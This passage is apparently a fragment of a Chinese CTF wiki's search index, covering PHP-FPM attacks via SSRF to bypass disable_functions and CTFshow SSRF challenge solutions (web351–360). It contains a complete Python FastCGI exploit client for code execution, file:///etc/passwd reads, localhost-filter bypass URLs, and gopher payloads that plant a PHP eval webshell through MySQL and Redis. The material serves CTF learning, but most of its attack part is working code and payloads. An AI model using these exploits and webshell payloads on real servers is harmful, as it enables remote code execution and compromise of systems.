Disable_Functions"},{"location":"CTFWiki/Web/RCE/\u7ed5\u8fc7disable_functions/#ssrfphp-fpm","text":"\u60f3\u8981\u5206\u6790\u5b83\u7684\u653b\u51fb\u539f\u7406\u9700\u8981\u4eceFastCGI\u534f\u8bae\u5c01\u88c5\u6570\u636e\u5185\u5bb9\u6765\u770b\uff0c\u8fd9\u91cc\u4ec5\u5bf9\u653b\u51fb\u539f\u7406\u505a\u7b80\u8981\u63cf\u8ff0\uff0c CGI \u548c FastCGI \u534f\u8bae\u7684\u8fd0\u884c\u539f\u7406 \u8fd9\u7bc7\u6587\u7ae0\u4e2d\u8be6\u7ec6\u4ecb\u7ecd\u4e86FastCGI\u534f\u8bae\u7684\u5185\u5bb9\uff0c\u5176\u653b\u51fb\u539f\u7406\u5c31\u662f\u5728\u8bbe\u7f6e\u73af\u5883\u53d8\u91cf\u5b9e\u9645\u8bf7\u6c42\u4e2d\u4f1a\u51fa\u73b0\u4e00\u4e2a SCRIPT_FILENAME': '/var/www/html/index.php \u8fd9\u6837\u7684\u952e\u503c\u5bf9\uff0c\u5b83\u7684\u610f\u601d\u662fphp-fpm\u4f1a\u6267\u884c\u8fd9\u4e2a\u6587\u4ef6\uff0c\u4f46\u662f\u8fd9\u6837\u5373\u4f7f\u80fd\u591f\u63a7\u5236\u8fd9\u4e2a\u952e\u503c\u5bf9\u7684\u503c\uff0c\u4f46\u4e5f\u53ea\u80fd\u63a7\u5236php-fpm\u53bb\u6267\u884c\u67d0\u4e2a\u5df2\u7ecf\u5b58\u5728\u7684\u6587\u4ef6\uff0c\u4e0d\u80fd\u591f\u5b9e\u73b0\u4e00\u4e9b \u6076\u610f\u4ee3\u7801 \u7684\u6267\u884c\u3002 \u800c\u5728php5.3.9\u540e\u6765\u7684\u7248\u672c\u4e2d\uff0cphp\u589e\u52a0\u4e86\u5b89\u5168\u9009\u9879\u5bfc\u81f4\u53ea\u80fd\u63a7\u5236php-fpm\u6267\u884c\u4e00\u4e9bphp\u3001php4\u8fd9\u6837\u7684\u6587\u4ef6\uff0c\u8fd9\u4e5f\u589e\u5927\u4e86\u653b\u51fb\u7684\u96be\u5ea6\u3002\u4f46\u662f\u597d\u5728php\u5b98\u65b9\u5141\u8bb8\u901a\u8fc7PHP_ADMIN_VALUE\u548cPHP_VALUE\u53bb\u52a8\u6001\u4fee\u6539php\u7684\u8bbe\u7f6e\u3002 \u90a3\u4e48\u5f53\u8bbe\u7f6ephp\u73af\u5883\u53d8\u91cf\u4e3a: auto_prepend_file = php://input;allow_url_include = On ,\u5c31\u4f1a\u5728\u6267\u884cphp\u811a\u672c\u4e4b\u524d\u5305\u542b auto_prepend_file \u6587\u4ef6\u7684\u5185\u5bb9, php://input \u4e5f\u5c31\u662fPOST\u7684\u5185\u5bb9,\u8fd9\u4e2a\u6211\u4eec\u53ef\u4ee5\u5728FastCGI\u534f\u8bae\u7684body\u63a7\u5236\u4e3a\u6076\u610f\u4ee3\u7801\uff0c\u8fd9\u6837\u5c31\u5728\u7406\u8bba\u4e0a\u5b9e\u73b0\u4e86php-fpm\u4efb\u610f\u4ee3\u7801\u6267\u884c\u7684\u653b\u51fb\u3002 PHP-FPM\u653b\u51fb\u811a\u672c import socket import random import argparse import sys from io import BytesIO import base64 import urllib # Referrer: https://github.com/wuyunfeng/Python-FastCGI-Client PY2 = True if sys . version_info . major == 2 else False def bchr ( i ): if PY2 : return force_bytes ( chr ( i )) else : return bytes ([ i ]) def bord ( c ): if isinstance ( c , int ): return c else : return ord ( c ) def force_bytes ( s ): if isinstance ( s , bytes ): return s else : return s . encode ( 'utf-8' , 'strict' ) def force_text ( s ): if issubclass ( type ( s ), str ): return s if isinstance ( s , bytes ): s = str ( s , 'utf-8' , 'strict' ) else : s = str ( s ) return s class FastCGIClient : \"\"\"A Fast-CGI Client for Python\"\"\" # private __FCGI_VERSION = 1 __FCGI_ROLE_RESPONDER = 1 __FCGI_ROLE_AUTHORIZER = 2 __FCGI_ROLE_FILTER = 3 __FCGI_TYPE_BEGIN = 1 __FCGI_TYPE_ABORT = 2 __FCGI_TYPE_END = 3 __FCGI_TYPE_PARAMS = 4 __FCGI_TYPE_STDIN = 5 __FCGI_TYPE_STDOUT = 6 __FCGI_TYPE_STDERR = 7 __FCGI_TYPE_DATA = 8 __FCGI_TYPE_GETVALUES = 9 __FCGI_TYPE_GETVALUES_RESULT = 10 __FCGI_TYPE_UNKOWNTYPE = 11 __FCGI_HEADER_SIZE = 8 # request state FCGI_STATE_SEND = 1 FCGI_STATE_ERROR = 2 FCGI_STATE_SUCCESS = 3 def __init__ ( self , host , port , timeout , keepalive ): self . host = host self . port = port self . timeout = timeout if keepalive : self . keepalive = 1 else : self . keepalive = 0 self . sock = None self . requests = dict () def __connect ( self ): self . sock = socket . socket ( socket . AF_INET , socket . SOCK_STREAM ) self . sock . settimeout ( self . timeout ) self . sock . setsockopt ( socket . SOL_SOCKET , socket . SO_REUSEADDR , 1 ) # if self.keepalive: # self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 1) # else: # self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 0) try : self . sock . connect (( self . host , int ( self . port ))) except socket . error as msg : self . sock . close () self . sock = None print ( repr ( msg )) return False return True def __encodeFastCGIRecord ( self , fcgi_type , content , requestid ): length = len ( content ) buf = bchr ( FastCGIClient . __FCGI_VERSION ) \\ + bchr ( fcgi_type ) \\ + bchr (( requestid >> 8 ) & 0xFF ) \\ + bchr ( requestid & 0xFF ) \\ + bchr (( length >> 8 ) & 0xFF ) \\ + bchr ( length & 0xFF ) \\ + bchr ( 0 ) \\ + bchr ( 0 ) \\ + content return buf def __encodeNameValueParams ( self , name , value ): nLen = len ( name ) vLen = len ( value ) record = b '' if nLen < 128 : record += bchr ( nLen ) else : record += bchr (( nLen >> 24 ) | 0x80 ) \\ + bchr (( nLen >> 16 ) & 0xFF ) \\ + bchr (( nLen >> 8 ) & 0xFF ) \\ + bchr ( nLen & 0xFF ) if vLen < 128 : record += bchr ( vLen ) else : record += bchr (( vLen >> 24 ) | 0x80 ) \\ + bchr (( vLen >> 16 ) & 0xFF ) \\ + bchr (( vLen >> 8 ) & 0xFF ) \\ + bchr ( vLen & 0xFF ) return record + name + value def __decodeFastCGIHeader ( self , stream ): header = dict () header [ 'version' ] = bord ( stream [ 0 ]) header [ 'type' ] = bord ( stream [ 1 ]) header [ 'requestId' ] = ( bord ( stream [ 2 ]) << 8 ) + bord ( stream [ 3 ]) header [ 'contentLength' ] = ( bord ( stream [ 4 ]) << 8 ) + bord ( stream [ 5 ]) header [ 'paddingLength' ] = bord ( stream [ 6 ]) header [ 'reserved' ] = bord ( stream [ 7 ]) return header def __decodeFastCGIRecord ( self , buffer ): header = buffer . read ( int ( self . __FCGI_HEADER_SIZE )) if not header : return False else : record = self . __decodeFastCGIHeader ( header ) record [ 'content' ] = b '' if 'contentLength' in record . keys (): contentLength = int ( record [ 'contentLength' ]) record [ 'content' ] += buffer . read ( contentLength ) if 'paddingLength' in record . keys (): skiped = buffer . read ( int ( record [ 'paddingLength' ])) return record def request ( self , nameValuePairs = {}, post = '' ): if not self . __connect (): print ( 'connect failure! please check your fasctcgi-server !!' ) return requestId = random . randint ( 1 , ( 1 << 16 ) - 1 ) self . requests [ requestId ] = dict () request = b \"\" beginFCGIRecordContent = bchr ( 0 ) \\ + bchr ( FastCGIClient . __FCGI_ROLE_RESPONDER ) \\ + bchr ( self . keepalive ) \\ + bchr ( 0 ) * 5 request += self . __encodeFastCGIRecord ( FastCGIClient . __FCGI_TYPE_BEGIN , beginFCGIRecordContent , requestId ) paramsRecord = b '' if nameValuePairs : for ( name , value ) in nameValuePairs . items (): name = force_bytes ( name ) value = force_bytes ( value ) paramsRecord += self . __encodeNameValueParams ( name , value ) if paramsRecord : request += self . __encodeFastCGIRecord ( FastCGIClient . __FCGI_TYPE_PARAMS , paramsRecord , requestId ) request += self . __encodeFastCGIRecord ( FastCGIClient . __FCGI_TYPE_PARAMS , b '' , requestId ) if post : request += self . __encodeFastCGIRecord ( FastCGIClient . __FCGI_TYPE_STDIN , force_bytes ( post ), requestId ) request += self . __encodeFastCGIRecord ( FastCGIClient . __FCGI_TYPE_STDIN , b '' , requestId ) self . sock . send ( request ) self . requests [ requestId ][ 'state' ] = FastCGIClient . FCGI_STATE_SEND self . requests [ requestId ][ 'response' ] = b '' return self . __waitForResponse ( requestId ) def gopher ( self , nameValuePairs = {}, post = '' ): requestId = random . randint ( 1 , ( 1 << 16 ) - 1 ) self . requests [ requestId ] = dict () request = b \"\" beginFCGIRecordContent = bchr ( 0 ) \\ + bchr ( FastCGIClient . __FCGI_ROLE_RESPONDER ) \\ + bchr ( self . keepalive ) \\ + bchr ( 0 ) * 5 request += self . __encodeFastCGIRecord ( FastCGIClient . __FCGI_TYPE_BEGIN , beginFCGIRecordContent , requestId ) paramsRecord = b '' if nameValuePairs : for ( name , value ) in nameValuePairs . items (): name = force_bytes ( name ) value = force_bytes ( value ) paramsRecord += self . __encodeNameValueParams ( name , value ) if paramsRecord : request += self . __encodeFastCGIRecord ( FastCGIClient . __FCGI_TYPE_PARAMS , paramsRecord , requestId ) request += self . __encodeFastCGIRecord ( FastCGIClient . __FCGI_TYPE_PARAMS , b '' , requestId ) if post : request += self . __encodeFastCGIRecord ( FastCGIClient . __FCGI_TYPE_STDIN , force_bytes ( post ), requestId ) request += self . __encodeFastCGIRecord ( FastCGIClient . __FCGI_TYPE_STDIN , b '' , requestId ) return request def __waitForResponse ( self , requestId ): data = b '' while True : buf = self . sock . recv ( 512 ) if not len ( buf ): break data += buf data = BytesIO ( data ) while True : response = self . __decodeFastCGIRecord ( data ) if not response : break if response [ 'type' ] == FastCGIClient . __FCGI_TYPE_STDOUT \\ or response [ 'type' ] == FastCGIClient . __FCGI_TYPE_STDERR : if response [ 'type' ] == FastCGIClient . __FCGI_TYPE_STDERR : self . requests [ 'state' ] = FastCGIClient . FCGI_STATE_ERROR if requestId == int ( response [ 'requestId' ]): self . requests [ requestId ][ 'response' ] += response [ 'content' ] if response [ 'type' ] == FastCGIClient . FCGI_STATE_SUCCESS : self . requests [ requestId ] return self . requests [ requestId ][ 'response' ] def __repr__ ( self ): return \"fastcgi connect host: {} port: {} \" . format ( self . host , self . port ) if __name__ == '__main__' : parser = argparse . ArgumentParser ( description = 'Php-fpm code execution vulnerability client.' ) parser . add_argument ( 'host' , help = 'Target host, such as 127.0.0.1' ) parser . add_argument ( 'file' , help = 'A php file absolute path, such as /usr/local/lib/php/System.php' ) parser . add_argument ( '-c' , '--code' , help = 'What php code your want to execute' , default = '' ) parser . add_argument ( '-p' , '--port' , help = 'FastCGI port' , default = 9000 , type = int ) parser . add_argument ( '-e' , '--ext' , help = 'ext absolute path' , default = '' ) parser . add_argument ( '-if' , '--include_file' , help = 'evil.php absolute path' , default = '' ) parser . add_argument ( '-u' , '--url_format' , help = 'generate gopher stream in url format' , nargs = '?' , const = 1 ) parser . add_argument ( '-b' , '--base64_format' , help = 'generate gopher stream in base64 format' , nargs = '?' , const = 1 ) args = parser . parse_args () client = FastCGIClient ( args . host , args . port , 3 , 0 ) params = dict () documentRoot = \"/\" uri = args . file params = { 'GATEWAY_INTERFACE' : 'FastCGI/1.0' , 'REQUEST_METHOD' : 'POST' , 'SCRIPT_FILENAME' : documentRoot + uri . lstrip ( '/' ), 'SCRIPT_NAME' : uri , 'QUERY_STRING' : '' , 'REQUEST_URI' : uri , 'DOCUMENT_ROOT' : documentRoot , 'SERVER_SOFTWARE' : 'php/fcgiclient' , 'REMOTE_ADDR' : '127.0.0.1' , 'REMOTE_PORT' : '9985' , 'SERVER_ADDR' : '127.0.0.1' , 'SERVER_PORT' : '80' , 'SERVER_NAME' : \"localhost\" , 'SERVER_PROTOCOL' : 'HTTP/1.1' , 'CONTENT_TYPE' : 'application/text' , 'CONTENT_LENGTH' : \" %d \" % len ( args . code ), 'PHP_VALUE' : 'auto_prepend_file = php://input' , 'PHP_ADMIN_VALUE' : 'allow_url_include = On' } if args . ext and args . include_file : #params['PHP_ADMIN_VALUE']='extension = '+args.ext params [ 'PHP_ADMIN_VALUE' ] = \"extension_dir = /var/www/html \\n extension = ant.so\" params [ 'PHP_VALUE' ] = 'auto_prepend_file = ' + args . include_file if not args . url_format and not args . base64_format : response = client . request ( params , args . code ) print ( force_text ( response )) else : response = client . gopher ( params , args . code ) if args . url_format : print ( urllib . quote ( response )) if args . base64_format : print ( base64 . b64encode ( response )) \u7136\u540e\u5728\u751f\u6210\u7684payload\u524d\u52a0\u4e0a gopher://ip:port/_ \u5f97\u5230\uff1a","title":"\u914d\u5408SSRF\u653b\u51fbPHP-FPM"},{"location":"CTFWiki/Web/RCE/\u7ed5\u8fc7disable_functions/#_5","text":"\u4f46\u662f\u63d2\u4ef6\u4e2d\u7684payload\u4f7f\u7528\u4e86 fsockopen() \uff0c\u5982\u679c fsockopen() \u88abban\u4e86\uff0c\u6216\u8005\u60f3\u8981\u4fee\u6539\u8681\u5251\u7684\u63d2\u4ef6\u4e2d\u7684\u5730\u5740127.0.0.1:9001 \u7684\u9009\u9879\u3002 \u4f46\u662f pfsockopen() \u6ca1\u6709\u88abban \u800c\u4e14\u4e24\u8005\u6ca1\u6709\u4efb\u4f55\u533a\u522b \u5c06\u8fd9\u4e24\u4e2a\u6587\u4ef6\u4e0b\u7684 fsockopen() \u6539\u6210 pfsockopen() \u5373\u53ef \\antData\\plugins\\as_bypass_php_disable_functions-master\\payload.js \\antData\\plugins\\as_bypass_php_disable_functions-master\\core\\php_fpm\\index.js \u5728 \\core\\php_fpm\\index.js \u53ef\u4ee5\u4fee\u6539\u4e0b\u62c9\u5217\u8868\u7684ip","title":"\u4f7f\u7528\u8681\u5251\u63d2\u4ef6\u5e76\u4fee\u6539\u7ed5\u8fc7"},{"location":"CTFWiki/Web/RCE/\u7ed5\u8fc7disable_functions/#_6","text":"\u6d45\u8c08\u51e0\u79cdBypass disable_functions\u7684\u65b9\u6cd5 \u6e17\u900f\u6d4b\u8bd5\u4e4b\u7ed5\u8fc7PHP\u7684disable_functions PHP Webshell\u4e0b\u7ed5\u8fc7disable_function\u7684\u65b9\u6cd5","title":"\u53c2\u8003\u6587\u7ae0"},{"location":"CTFWiki/Web/RCE/\u9650\u5236\u957f\u5ea6\u547d\u4ee4\u6267\u884c/","text":"\u9650\u5236\u957f\u5ea6\u547d\u4ee4\u6267\u884c \u00b6 \u770b\u770b\u8fd9\u4e24\u7bc7\u6587\u7ae0\u5c31\u8db3\u591f\u4e86 \u4ece\u4e00\u9053ctf\u9898\u76ee\u5b66\u5230\u7684\u7ed5\u8fc7\u957f\u5ea6\u6267\u884c\u547d\u4ee4\u59ff\u52bf CTF | \u9650\u5236\u957f\u5ea6\u4e0b\u7684\u547d\u4ee4\u6267\u884c \u6280\u5de7\u6c47\u603b","title":"\u9650\u5236\u957f\u5ea6\u547d\u4ee4\u6267\u884c"},{"location":"CTFWiki/Web/RCE/\u9650\u5236\u957f\u5ea6\u547d\u4ee4\u6267\u884c/#_1","text":"\u770b\u770b\u8fd9\u4e24\u7bc7\u6587\u7ae0\u5c31\u8db3\u591f\u4e86 \u4ece\u4e00\u9053ctf\u9898\u76ee\u5b66\u5230\u7684\u7ed5\u8fc7\u957f\u5ea6\u6267\u884c\u547d\u4ee4\u59ff\u52bf CTF | \u9650\u5236\u957f\u5ea6\u4e0b\u7684\u547d\u4ee4\u6267\u884c \u6280\u5de7\u6c47\u603b","title":"\u9650\u5236\u957f\u5ea6\u547d\u4ee4\u6267\u884c"},{"location":"CTFWiki/Web/SSRF/CTFSHOW-SSRF-WP/","text":"\u4f8b\u9898\u5206\u6790 \u00b6 web351 \u00b6 \u9996\u5148\u4ee3\u7801\u5ba1\u8ba1\uff0c\u7b80\u7b80\u5355\u5355\u7684\u4f7f\u7528php\u7684curl\uff0c\u53d1\u73b0\u6ca1\u6709\u8fc7\u6ee4\uff0c\u5c1d\u8bd5\u8bfb\u53d6\u672c\u5730\u6587\u4ef6 <?php error_reporting(0); highlight_file(__FILE__); $url=$_POST['url']; $ch=curl_init($url); curl_setopt($ch, CURLOPT_HEADER, 0); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); $result=curl_exec($ch); curl_close($ch); echo ($result); ?> post\u6570\u636e url=file:///etc/passwd \uff0c\u6709\u56de\u663e\uff0c\u4eceBurp\u6293\u5305\u4fe1\u606f\u6211\u770b\u5230\u4e86\u662fnginx\u5c1d\u8bd5\u8bfb\u53d6nginx\u7684\u914d\u7f6e\u6587\u4ef6 url=file:///etc/nginx/nginx.conf daemon off; worker_processes auto; error_log /var/log/nginx/error.log warn; events { worker_connections 1024; } http { include /etc/nginx/mime.types; default_type application/octet-stream; sendfile on; keepalive_timeout 65; server { listen 80; server_name localhost; root /var/www/html; index index.php; proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; location / { try_files $uri $uri/ /index.php?$args; } location ~ \\.php$ { try_files $uri =404; fastcgi_pass 127.0.0.1:9000; fastcgi_index index.php; include fastcgi_params; fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name; } } } \u6ca1\u5565\u592a\u591a\u5173\u952e\u4fe1\u606f\uff0c\u4e3b\u8981\u662f\u8bf4\u4e86\u6839\u76ee\u5f55\uff0c\u7136\u540e\u8fd8\u53d1\u73b0\u8fd9\u91cc\u6709fastcgi\uff01\uff01\uff01\u610f\u5473\u7740\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7gopher\u534f\u8bae\u6253fastcgi\uff0c\u6211\u6d4b\u8bd5\u4e86ok\u7684\u6210\u529f\u4e86\uff0c\u4f46\u662f\u6211\u4eec\u8fd9\u91cc\u8fd8\u662f\u8bb2\u4ee5\u4e0b\u9884\u671f\u89e3 \u91c7\u7528file\u534f\u8bae\u8bfb\u53d6flag.php url=file:///var/www/html/flag.php F12\u67e5\u770b\u6ce8\u91ca\u83b7\u53d6flag <?php $flag=\"flag{15a45540-97e2-47d8-a505-2cd9bac4ea94}\"; if($_SERVER['REMOTE_ADDR']=='127.0.0.1'){ echo $flag; } else{ die(\"\u975e\u672c\u5730\u7528\u6237\u7981\u6b62\u8bbf\u95ee\"); } ?> web352-353 \u00b6 \u8fdb\u5236\u7ed5\u8fc7,\u8fd9\u91cc\u6709\u4e2a\u5728\u7ebf\u8f6c\u6362\u7f51\u7ad9 https://tool.520101.com/wangluo/jinzhizhuanhuan/ \u7136\u540epost url=http://2130706433/flag.php \u5176\u4ed6\u66f4\u6539 IP \u5730\u5740\u5199\u6cd5\u4e5f\u884c \u5341\u516d\u8fdb\u5236 url=http://0x7F.0.0.1/flag.php \u516b\u8fdb\u5236 url=http://0177.0.0.1/flag.php 10 \u8fdb\u5236\u6574\u6570\u683c\u5f0f url=http://2130706433/flag.php 16 \u8fdb\u5236\u6574\u6570\u683c\u5f0f\uff0c\u8fd8\u662f\u4e0a\u9762\u90a3\u4e2a\u7f51\u7ad9\u8f6c\u6362\u8bb0\u5f97\u524d\u7f000x url=http://0x7F000001/flag.php \u8fd8\u6709\u4e00\u79cd\u7279\u6b8a\u7684\u7701\u7565\u6a21\u5f0f 127.0.0.1\u5199\u6210127.1 \u7528CIDR\u7ed5\u8fc7localhost url=http://127.127.127.127/flag.php \u8fd8\u6709\u5f88\u591a\u65b9\u5f0f\u4e0d\u60f3\u591a\u5199\u4e86 url=http://0/flag.php url=http://0.0.0.0/flag.php web354 \u00b6 DNS-Rebinding\u653b\u51fb\u7ed5\u8fc7 url=http://r.xxxzc8.ceye.io/flag.php \u81ea\u5df1\u53bbceye.io\u6ce8\u518c\u7ed1\u5b9a127.0.0.1\u7136\u540e\u8bb0\u5f97\u524d\u9762\u52a0r 302\u8df3\u8f6c\u7ed5\u8fc7\u4e5f\u884c\uff0c\u5728\u81ea\u5df1\u7684\u7f51\u7ad9\u4e3b\u9875\u52a0\u4e0a\u8fd9\u4e2a <?php header(\"Location:http://127.0.0.1/flag.php\"); \u6216\u8005\u8bf4\u7fa4\u4e3b\u8bf4\u6211\u4e27\u5fc3\u75c5\u72c2\u7684\u65b9\u5f0f \u6211\u81ea\u5df1\u7684\u57df\u540dA\u8bb0\u5f55\u8bbe\u4e3a\u4e86127.0.0.1 \u6216\u8005\u6709\u4e2a\u73b0\u6210\u7684A\u8bb0\u5f55\u662f127.0.0.1\u7684\u7f51\u7ad9 url=http://sudo.cc/flag.php web355 \u00b6 \u8bbe\u7f6e\u4e86$host<5\u7684\u9650\u5236\uff0c\u968f\u4fbf\u6765\u4e2a\u5229\u7528127.0.0.1=127.1\u521a\u597d\u662f5\u4f4d url=http://127.1/flag.php web356 \u00b6 \u66f4\u7edd\u4e86\u9650\u5236$host<3\uff0c\u8001\u89c4\u77e9 url=http://0/flag.php web357 \u00b6 \u5173\u952e\u4ee3\u7801\uff0c\u4e0d\u80fd\u662f\u4e00\u4e9b\u79c1\u6709\u5730\u5740 if(!filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) { die('ip!'); } FILTER_FLAG_IPV4 - \u8981\u6c42\u503c\u662f\u5408\u6cd5\u7684 IPv4 IP\uff08\u6bd4\u5982 255.255.255.255\uff09 FILTER_FLAG_IPV6 - \u8981\u6c42\u503c\u662f\u5408\u6cd5\u7684 IPv6 IP\uff08\u6bd4\u5982 2001:0db8:85a3:08d3:1319:8a2e:0370:7334\uff09 FILTER_FLAG_NO_PRIV_RANGE - \u8981\u6c42\u503c\u662f RFC \u6307\u5b9a\u7684\u79c1\u57df IP \uff08\u6bd4\u5982 192.168.0.1\uff09 FILTER_FLAG_NO_RES_RANGE - \u8981\u6c42\u503c\u4e0d\u5728\u4fdd\u7559\u7684 IP \u8303\u56f4\u5185\u3002\u8be5\u6807\u5fd7\u63a5\u53d7 IPV4 \u548c IPV6 \u503c\u3002 \u7528web354\u8bf4\u8fc7\u7684DNS-Rebinding\u4e0e302\u8df3\u8f6c\u5373\u53ef\u89e3\u9898 web358 \u00b6 \u9650\u5236\u662f\u8fd9\u4e2a if(preg_match('/^http:\\/\\/ctf\\..*show$/i',$url)){ echo file_get_contents($url); } blackhat\u8bae\u9898\u52a0\u4e0aurl\u89e3\u6790\u7279\u6027php\u7684curl\u9ed8\u8ba4\u662f@\u540e\u9762\u7684\u90e8\u5206\u52a0\u4e0a?url\u89e3\u6790\u7684\u65f6\u5019\u4f1a\u628a\u4ed6\u5f53\u6210url\u89e3\u6790\u7684get\u8bf7\u6c42\u53c2\u6570 url=http://ctf.@127.0.0.1/flag.php?.show web359 \u00b6 \u4f7f\u7528\u5de5\u5177gopherus\u751f\u6210\u5373\u53ef\uff0c \u5de5\u5177\u5730\u5740 Give MySQL username: root Give query to execute: select '<?php eval($_POST[pass]); ?>' INTO OUTFILE '/var/www/html/2.php'; gopher://127.0.0.1:3306/_%a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%72%6f%6f%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%4a%00%00%00%03%73%65%6c%65%63%74%20%27%3c%3f%70%68%70%20%65%76%61%6c%28%24%5f%50%4f%53%54%5b%70%61%73%73%5d%29%3b%20%3f%3e%27%20%49%4e%54%4f%20%4f%55%54%46%49%4c%45%20%27%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%2f%32%2e%70%68%70%27%3b%01%00%00%00%01 \u7136\u540e\u6ce8\u610f \u8fd9\u90e8\u5206url\u9700\u8981\u7279\u6b8a\u5b57\u7f16\u7801\uff0ccurl\u4f1a\u9ed8\u8ba4\u89e3\u7801\u4e00\u6b21 %a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%72%6f%6f%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%4a%00%00%00%03%73%65%6c%65%63%74%20%27%3c%3f%70%68%70%20%65%76%61%6c%28%24%5f%50%4f%53%54%5b%70%61%73%73%5d%29%3b%20%3f%3e%27%20%49%4e%54%4f%20%4f%55%54%46%49%4c%45%20%27%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%2f%32%2e%70%68%70%27%3b%01%00%00%00%01 web360 \u00b6 \u6ca1\u5565\u597d\u8bf4\u7684gopher\u6253redis url=gopher://127.0.0.1:6379/_%252A1%250D%250A%25248%250D%250Aflushall%250D%250A%252A3%250D%250A%25243%250D%250Aset%250D%250A%25241%250D%250A1%250D%250A%252432%250D%250A%250A%250A%253C%253Fphp%2520eval%2528%2524_POST%255Bpass%255D%2529%253B%2520%253F%253E%250A%250A%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%25243%250D%250Adir%250D%250A%252413%250D%250A/var/www/html%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%25249%250D%250Ashell.php%250D%250A%252A1%250D%250A%25244%250D%250Asave%250D%250A%250A \u7136\u540e\u8bbf\u95eeshell.php\uff0c\u91cc\u9762\u7684\u5185\u5bb9\u662f\u8fd9\u4e2a <?php eval($_POST[pass]); ?>","title":"\u4f8b\u9898\u5206\u6790"},{"location":"CTFWiki/Web/SSRF/CTFSHOW-SSRF-WP/#_1","text":"","title":"\u4f8b\u9898\u5206\u6790"},{"location":"CTFWiki/Web/SSRF/CTFSHOW-SSRF-WP/#web351","text":"\u9996\u5148\u4ee3\u7801\u5ba1\u8ba1\uff0c\u7b80\u7b80\u5355\u5355\u7684\u4f7f\u7528php\u7684curl\uff0c\u53d1\u73b0\u6ca1\u6709\u8fc7\u6ee4\uff0c\u5c1d\u8bd5\u8bfb\u53d6\u672c\u5730\u6587\u4ef6 <?php error_reporting(0); highlight_file(__FILE__); $url=$_POST['url']; $ch=curl_init($url); curl_setopt($ch, CURLOPT_HEADER, 0); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); $result=curl_exec($ch); curl_close($ch); echo ($result); ?> post\u6570\u636e url=file:///etc/passwd \uff0c\u6709\u56de\u663e\uff0c\u4eceBurp\u6293\u5305\u4fe1\u606f\u6211\u770b\u5230\u4e86\u662fnginx\u5c1d\u8bd5\u8bfb\u53d6nginx\u7684\u914d\u7f6e\u6587\u4ef6 url=file:///etc/nginx/nginx.conf daemon off; worker_processes auto; error_log /var/log/nginx/error.log warn; events { worker_connections 1024; } http { include /etc/nginx/mime.types; default_type application/octet-stream; sendfile on; keepalive_timeout 65; server { listen 80; server_name localhost; root /var/www/html; index index.php; proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; location / { try_files $uri $uri/ /index.php?$args; } location ~ \\.php$ { try_files $uri =404; fastcgi_pass 127.0.0.1:9000; fastcgi_index index.php; include fastcgi_params; fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name; } } } \u6ca1\u5565\u592a\u591a\u5173\u952e\u4fe1\u606f\uff0c\u4e3b\u8981\u662f\u8bf4\u4e86\u6839\u76ee\u5f55\uff0c\u7136\u540e\u8fd8\u53d1\u73b0\u8fd9\u91cc\u6709fastcgi\uff01\uff01\uff01\u610f\u5473\u7740\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7gopher\u534f\u8bae\u6253fastcgi\uff0c\u6211\u6d4b\u8bd5\u4e86ok\u7684\u6210\u529f\u4e86\uff0c\u4f46\u662f\u6211\u4eec\u8fd9\u91cc\u8fd8\u662f\u8bb2\u4ee5\u4e0b\u9884\u671f\u89e3 \u91c7\u7528file\u534f\u8bae\u8bfb\u53d6flag.php url=file:///var/www/html/flag.php F12\u67e5\u770b\u6ce8\u91ca\u83b7\u53d6flag <?php $flag=\"flag{15a45540-97e2-47d8-a505-2cd9bac4ea94}\"; if($_SERVER['REMOTE_ADDR']=='127.0.0.1'){ echo $flag; } else{ die(\"\u975e\u672c\u5730\u7528\u6237\u7981\u6b62\u8bbf\u95ee\"); } ?>","title":"web351"},{"location":"CTFWiki/Web/SSRF/CTFSHOW-SSRF-WP/#web352-353","text":"\u8fdb\u5236\u7ed5\u8fc7,\u8fd9\u91cc\u6709\u4e2a\u5728\u7ebf\u8f6c\u6362\u7f51\u7ad9 https://tool.520101.com/wangluo/jinzhizhuanhuan/ \u7136\u540epost url=http://2130706433/flag.php \u5176\u4ed6\u66f4\u6539 IP 